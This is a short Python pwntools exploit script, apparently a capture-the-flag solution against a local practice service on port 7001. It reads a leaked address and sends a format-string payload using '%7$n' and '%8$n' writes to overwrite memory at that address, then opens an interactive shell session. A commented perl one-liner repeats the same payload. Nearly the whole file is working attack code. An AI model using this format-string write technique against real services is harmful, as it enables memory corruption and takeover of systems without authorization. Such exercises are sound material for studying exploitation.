#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import struct
from pwn import *

def pad(s):
    return s + "Z" * (100 - len(s))

def main():
    address = "localhost"
    port = 7001

    payload = ""

    r = remote( address, port )

    resp = r.recvline()
    to_overwrite = resp.split('\n')[0].split(' ')[-1]

    print "[!] To overwrite: ", to_overwrite

    resp = r.recvrepeat(0.2)

    # r <<< $(perl -e 'print "A\xbb\xd5\xff\xff\xbd\xd5\xff\xff%7\$.21053x%7\$n%8\$.61960x%8\$n"')

    # %7\$.21053x
    # %7\$n
    # %8\$.61960x
    # %8\$n

    payload += "A"
    payload += p32( int(to_overwrite, 16) )
    payload += p32( int(to_overwrite, 16) + 2 )
    payload += '%7$.21053x'
    payload += '%7$n'
    payload += '%8$.61960x'
    payload += '%8$n'

    r.sendline( pad(payload) )

    r.interactive()


if __name__ == '__main__':
    main()


# ffffd3dbf7ffcf1c565562d38f7ff0f7625ffd00025782578257825782578257825782578
